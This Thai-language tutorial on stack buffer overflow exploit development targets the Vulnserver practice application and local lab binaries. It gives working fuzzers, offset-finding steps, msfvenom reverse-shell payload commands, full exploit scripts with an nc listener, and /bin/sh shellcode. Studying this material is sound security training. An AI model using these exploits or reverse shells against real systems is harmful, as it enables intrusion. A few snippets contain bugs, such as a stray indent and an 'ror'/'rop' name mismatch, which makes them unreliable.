# Part 40: Buffer Overflow Basics - Stack Overflow และ Exploit Development

## สารบัญ
1. [หลักการของ Buffer Overflow](#1-หลักการของ-buffer-overflow)
2. [การตั้งค่า Lab Environment](#2-การตั้งค่า-lab-environment)
3. [Fuzzing - หาจุดที่ Crash](#3-fuzzing---หาจุดที่-crash)
4. [หา EIP Offset](#4-หา-eip-offset)
5. [Bad Characters และ Return Address](#5-bad-characters-และ-return-address)
6. [Shellcode และการเขียน Exploit](#6-shellcode-และการเขียน-exploit)
7. [NOP Sled](#7-nop-sled)
8. [Linux Buffer Overflow](#8-linux-buffer-overflow)
9. [DEP/ASLR และการ Bypass เบื้องต้น](#9-depaslr-และการ-bypass-เบื้องต้น)
10. [แบบฝึกหัด Lab](#10-แบบฝึกหัด-lab)

---

## 1. หลักการของ Buffer Overflow

### ความเข้าใจ Stack และ Memory Layout

```
Memory Layout (High -> Low address):

+------------------+ 0xFFFFFFFF
| Stack           | <- เติบโตลง (LIFO)
| (local vars,    |
|  return addr,   |
|  saved EBP)     |
+------------------+
|        |        |
|        v        | <- Stack grows down
|                 |
|        ^        | <- Heap grows up
|        |        |
+------------------+
| Heap            | <- dynamic allocation (malloc)
+------------------+
| BSS Segment     | <- uninitialized globals
+------------------+
| Data Segment    | <- initialized globals
+------------------+
| Text Segment    | <- code (read-only)
+------------------+ 0x00000000

Stack Frame:
+------------------+ Higher address
| Function args   |
+------------------+
| Return Address  | <- EIP (saved return address)
+------------------+
| Saved EBP       |
+------------------+
| Local Variables | <- Buffer is here
| (Buffer 64 bytes)|
+------------------+ Lower address (ESP)
```

### การเกิด Buffer Overflow

```c
// ตัวอย่างโปรแกรมที่บั๊ก
#include <string.h>
#include <stdio.h>

void vulnerable(char *input) {
    char buffer[64];          // buffer ขนาด 64 bytes
    strcpy(buffer, input);    // ไม่ตรวจสอบขนาด!
    printf("%s\n", buffer);
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}

// ถ้าส่ง input > 64 bytes:
// - Overflow ตัวแปร buffer
// - Overwrite saved EBP
// - Overwrite Return Address (EIP)
// - Control EIP = control execution!
```

### Registers ที่สำคัญ

```
x86 (32-bit) Registers:
- EIP = Instruction Pointer (ชี้ code ที่จะ execute ต่อไป)
- ESP = Stack Pointer (ชี้ top of stack)
- EBP = Base Pointer (ชี้ bottom of stack frame)
- EAX, EBX, ECX, EDX = General purpose

x64 (64-bit) Registers:
- RIP, RSP, RBP, RAX...
```

---

## 2. การตั้งค่า Lab Environment

### Windows Lab (Immunity Debugger)

```bash
# ต้องใช้:
# - Windows VM (32-bit app)
# - Immunity Debugger + mona.py
# - Vulnerable application
# - Kali Linux (attacker)

# ตัวอย่าง: Vulnserver (TRUN command)
# https://github.com/stephenbradshaw/vulnserver

# ติดตั้ง mona.py
# หลังจากเปิด Immunity:
# !mona config -set workingfolder c:\mona\%p
```

### Linux Lab (GDB)

```bash
# ติดตั้ง tools
apt install gcc gdb pwndbg

# Compile vulnerable program (ไม่มี protections)
cat > vuln.c << 'EOF'
#include <string.h>
#include <stdio.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    return 0;
}
EOF

# คอมไฟล์โดยไม่มี protections
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

# ปิด ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# ทดสอบ crash
./vuln $(python3 -c "print('A'*100)")
# Segmentation fault
```

---

## 3. Fuzzing - หาจุดที่ Crash

### Python Fuzzer

```python
#!/usr/bin/env python3
# fuzzer.py - สำหรับ Vulnserver
import socket
import sys
import time

IP = '192.168.1.200'  # Windows target
PORT = 9999

print("[*] Fuzzing Vulnserver TRUN command")

buffer = b'A'
step = 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((IP, PORT))
        
        # อ่าน banner
        banner = s.recv(1024)
        
        # ส่ง payload
        payload = b'TRUN /.:/' + buffer
        s.send(payload)
        
        response = s.recv(1024)
        s.close()
        
        print(f"[*] Sent {len(buffer)} bytes - OK")
        time.sleep(0.5)
        
        buffer += b'A' * step
        
    except Exception as e:
        print(f"[!] Crash at {len(buffer)} bytes!")
        print(f"[!] Error: {e}")
        break

# Output:
# [*] Sent 100 bytes - OK
# [*] Sent 200 bytes - OK
# ...
# [*] Sent 2100 bytes - OK
# [!] Crash at 2200 bytes!
```

---

## 4. หา EIP Offset

### สร้าง Cyclic Pattern

```bash
# ใช้ msf-pattern_create
msf-pattern_create -l 2200
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...

# ส่ง pattern ไป (ดูใน Immunity: EIP value)
# สมมติ EIP = 386F4337

# หา offset
msf-pattern_offset -l 2200 -q 386F4337
# [*] Exact match at offset 2003

# หรือใช้ pwndbg (Linux)
# cyclic 200
# Aa0Aa1Aa2Aa3...
# ./vuln Aa0Aa1...
# [--registers--]
# EIP: 0x61616166 ('faaa')
# cyclic -l 0x61616166
# 20
```

### ยืนยัน Offset

```python
#!/usr/bin/env python3
# verify_offset.py
import socket

IP = '192.168.1.200'
PORT = 9999
OFFSET = 2003

# ประกอบด้วย:
# A * OFFSET (padding)
# B * 4 (overwrite EIP - ควรเป็น 42424242)
# C * 200 (space for shellcode)

payload = b'A' * OFFSET
payload += b'B' * 4   # EIP
payload += b'C' * 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
s.recv(1024)
s.send(b'TRUN /.:/' + payload)
s.recv(1024)
s.close()

print(f"[+] Sent: A x{OFFSET} + B x4 + C x200")
print(f"[+] EIP should be 42424242 in debugger")
# ใน Immunity: EIP = 42424242 (ถูกต้อง!)
```

---

## 5. Bad Characters และ Return Address

### หา Bad Characters

```python
#!/usr/bin/env python3
# bad_chars.py
import socket

# สร้าง all chars (0x00 ถึง 0xFF)
all_chars = bytes(range(0x00, 0x100))

# โดยทั่วไป 0x00 (สิ้นสุด string) เป็น bad char
all_chars = bytes([x for x in range(0x01, 0x100)])  # หลีก 0x00

IP = '192.168.1.200'
PORT = 9999
OFFSET = 2003

payload = b'A' * OFFSET
payload += b'B' * 4
payload += all_chars  # all_chars อยู่ใน ESP

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
s.recv(1024)
s.send(b'TRUN /.:/' + payload)
s.recv(1024)
s.close()

print("[+] Sent all chars in ESP")
print("[+] Compare ESP dump in debugger with all_chars")
print("[+] Find missing/corrupted bytes = bad chars")

# ใน Immunity Debugger:
# !mona bytearray -b '\x00'  <- อัปเดต bad chars
# !mona compare -f C:\mona\vulnserver\bytearray.bin -a ESP_ADDRESS
# เปรียบเทียบ bytes
```

### หา JMP ESP Address

```python
# ใน Immunity Debugger
# !mona jmp -r esp -cpb '\x00\x0a\x0d'
# หา JMP ESP instruction ที่ไม่มี bad chars

# Output:
# 0x625011af : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ}
#              [essfunc.dll] ASLR: False, SafeSEH: False

# Return address: 0x625011af
# เขียนเป็น little-endian: \xaf\x11\x50\x62
```

---

## 6. Shellcode และการเขียน Exploit

### สร้าง Shellcode ด้วย msfvenom

```bash
# Windows reverse shell shellcode
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  EXITFUNC=thread \
  -b '\x00\x0a\x0d' \
  -f python

# Output:
buf =  b""
buf += b"\xdb\xd2\xbe\xd3\xa6\x5b\x8a\xd9\x74\x24\xf4\x5d"
buf += b"\x33\xc9\xb1\x52\x31\x75\x17\x03\x75\x17\x83\xed"
# ...

# Linux x86 reverse shell
msfvenom -p linux/x86/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -b '\x00' \
  -f python
```

### เขียน Final Exploit

```python
#!/usr/bin/env python3
# exploit.py - Vulnserver TRUN
import socket
import struct

IP = '192.168.1.200'
PORT = 9999

# Shellcode (msfvenom output)
buf =  b""
buf += b"\xdb\xd2\xbe\xd3\xa6\x5b\x8a"  # ตัวอย่าง
buf += b"\xd9\x74\x24\xf4\x5d\x33\xc9"  # ใส่ shellcode จริง

# Exploit components:
OFFSET = 2003
JMP_ESP = 0x625011af  # JMP ESP address (no ASLR)

# \x90 = NOP (No Operation) - NOP Sled
nop_sled = b'\x90' * 16

# Build payload
payload = b'A' * OFFSET
payload += struct.pack('<I', JMP_ESP)  # Overwrite EIP (little-endian)
payload += nop_sled
payload += buf

print(f"[*] Exploit size: {len(payload)} bytes")
print(f"[*] EIP = {hex(JMP_ESP)}")

# Setup listener: nc -nlvp 4444
print("[*] Start listener: nc -nlvp 4444")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
s.recv(1024)
s.send(b'TRUN /.:/' + payload)
print("[+] Payload sent!")
s.close()

# เมื่อ exploit สำเร็จ:
# $ nc -nlvp 4444
# Listening on 0.0.0.0 4444
# Connection from 192.168.1.200
# Microsoft Windows
# C:\vulnserver>
```

---

## 7. NOP Sled

```
NOP Sled (\x90 = 0x90):

+------------------+
| padding (A's)   |
+------------------+
| JMP ESP         | <- EIP ชี้มาที่นี่
+------------------+
| NOP NOP NOP...  | <- NOP sled (16-64 bytes)
| \x90 \x90 \x90  |    ถ้า ESP ไม่ตรงเปะะะ
+------------------+    shellcode ก็ยัง execute ได้
| SHELLCODE       |
+------------------+

- NOP = No Operation (\x90)
- CPU ทำ nothing แล้วเลื่อนไปยัง instruction ถัดไป
- ช่วยเพิ่มโอกาสที่ ESP จะลงใน shellcode
```

---

## 8. Linux Buffer Overflow

```bash
# Compile vulnerable program
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

# GDB + pwndbg
gdb ./vuln

# ใน GDB
(gdb) run $(python3 -c "print('A'*100)")
# Program received signal SIGSEGV

# หา offset ด้วย cyclic
(gdb) run $(python3 -c "from pwn import *; print(cyclic(100).decode())")

# ดู EIP
(gdb) info reg eip
# eip  0x61616166

# หา offset
(gdb) python from pwn import *; print(cyclic_find(0x61616166))
# 20

# หา address ของ buffer (สำหรับ ASLR disabled)
(gdb) run $(python3 -c "print('B'*24)")
(gdb) x/s $esp-24
# 0xffffd000: "BBBBBBBBBBBBBBBBBBBBBBBB"

# Return address = ESP - offset หรือใช้ NOP sled
```

### Python Exploit (Linux)

```python
#!/usr/bin/env python3
from pwn import *

# ตั้งค่า
 context.arch = 'i386'
context.os = 'linux'

# shellcode - execve /bin/sh
shellcode = asm("""
    xor eax, eax
    push eax          ; NULL terminator
    push 0x68732f2f   ; //sh
    push 0x6e69622f   ; /bin
    mov ebx, esp      ; ptr to /bin//sh
    push eax          ; NULL
    mov edx, esp      ; envp = NULL
    push ebx          ; ptr
    mov ecx, esp      ; argv
    mov al, 11        ; execve syscall
    int 0x80
""")

OFFSET = 20
RET_ADDR = 0xffffd000  # address of buffer (from GDB, ASLR disabled)
nop_sled = b'\x90' * 16

payload = b'A' * OFFSET
payload += p32(RET_ADDR)  # little-endian
payload += nop_sled
payload += shellcode

print(f"[*] Payload: {len(payload)} bytes")
print(f"[*] Shellcode: {len(shellcode)} bytes")

# เรียก program
proc = process(['./vuln', payload])
proc.interactive()
```

---

## 9. DEP/ASLR และการ Bypass เบื้องต้น

### Protections ที่พบในระบบสมัยใหม่

```
Protections:
1. ASLR (Address Space Layout Randomization)
   - Stack, heap, library addresses เปลี่ยนทุก run
   - Bypass: Information leak, partial overwrite, brute force

2. DEP/NX (Data Execution Prevention / No-eXecute)
   - Stack ไม่สามารถ execute code
   - Bypass: ROP (Return-Oriented Programming)

3. Stack Canary
   - Magic value ระหว่าง buffer และ return address
   - Bypass: Information leak, overwrite specific address

4. PIE (Position-Independent Executable)
   - Code section รันตำแหน่ง random
   - Bypass: Information leak
```

### ROP (Return-Oriented Programming) เบื้องต้น

```bash
# ROP = ใช้ "gadgets" (code snippets) ที่มีอยู่แล้วใน memory
# แต่ละ gadget จบด้วย ret instruction
# Chain หลาย gadgets เพื่อทำ syscall

# หา ROP gadgets ด้วย ROPgadget
ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 | grep 'pop eax ; ret'

# หรือ pwntools
python3 << 'EOF'
from pwn import *
elf = ELF('./vuln')
ror = ROP(elf)
rop.call('execve', [b'/bin/sh', 0, 0])
print(rop.dump())
EOF

# ret2libc (bypass NX โดย call system())
# - หา system() address ใน libc
# - หา /bin/sh string address
# - Overwrite EIP -> system() -> /bin/sh
```

---

## 10. แบบฝึกหัด Lab

### Lab 1: Linux Buffer Overflow (No Protections)

```bash
# สร้าง vulnerable program
cat > lab1.c << 'EOF'
#include <string.h>
#include <stdio.h>
void secret() {
    system("/bin/sh");
}
void vulnerable(char *input) {
    char buffer[32];
    strcpy(buffer, input);
}
int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    printf("Normal exit\n");
    return 0;
}
EOF

gcc -m32 -fno-stack-protector -z execstack -no-pie -o lab1 lab1.c
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# หา address ของ secret()
objdump -d lab1 | grep secret
# 0804849b <secret>:

# หา offset
gdb lab1
(gdb) run $(python3 -c "from pwn import *; print(cyclic(60).decode())")
(gdb) info reg eip

# Exploit: overwrite return address to secret()
python3 -c "
from pwn import *
OFFSET = 44  # หาจาก cyclic
SECRET = 0x0804849b
payload = b'A' * OFFSET + p32(SECRET)
print(payload.decode('latin-1'))
" | xargs ./lab1
```

### Lab 2: Vulnserver Windows

```python
#!/usr/bin/env python3
# lab2_vulnserver.py
import socket
import struct

IP = '192.168.1.200'
PORT = 9999

# สร้าง reverse shell ด้วย msfvenom:
# msfvenom -p windows/shell_reverse_tcp LHOST=KALI LPORT=4444 -b '\x00' -f python

# ตัวอย่าง shellcode
buf = b"\x90" * 16  # NOP sled เป็น placeholder

OFFSET = 2003
JMP_ESP = 0x625011af

payload = b'A' * OFFSET
payload += struct.pack('<I', JMP_ESP)
payload += buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
s.recv(1024)
s.send(b'TRUN /.:/' + payload)
s.close()
print("[+] Exploit sent!")
```

---

## สรุป - Buffer Overflow Steps

| ขั้นตอน | วิธีการ | เครื่องมือ |
|-----------|-----------|----------|
| 1. Fuzzing | ส่ง input ใหญ่ขึ้นเรื่อยๆ | Python socket |
| 2. Find offset | cyclic pattern | msf-pattern_create |
| 3. Control EIP | ยืนยัน BBBB | Python |
| 4. Bad chars | หา bytes ที่ถูก corrupt | mona.py |
| 5. JMP ESP | หา return address | mona jmp -r esp |
| 6. Shellcode | msfvenom | -b bad_chars |
| 7. Exploit | รวมทุกอย่าง | Python struct.pack |

---

**ต่อไป:** [Part 41 - Advanced Exploit Development](Part-41-Advanced-Exploit-Development.md)
